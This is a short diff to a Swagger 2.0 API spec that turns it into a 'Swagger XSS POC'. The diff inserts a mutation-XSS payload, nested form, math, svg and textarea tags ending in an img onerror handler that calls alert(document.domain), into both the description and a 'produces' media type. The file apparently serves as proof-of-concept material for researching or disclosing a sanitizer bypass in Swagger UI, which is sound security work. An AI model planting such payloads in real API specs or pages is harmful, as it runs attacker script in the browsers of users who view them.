@@ -1,6 +1,6 @@
 swagger: '2.0'
 info:
-  title: Classic API Resource Documentation
+  title: Swagger XSS POC
   description: |
     <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.domain) src=1>"></form>
 
@@ -8,8 +8,8 @@ info:
 basePath: /JSSResource/
 produces:
   - application/xml
-  - application/json\"%00gg
-  - \%22><g>
+  - application/json
+  - <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.domain) src=1>"></form>
 consumes:
   - application/xml
   - application/json
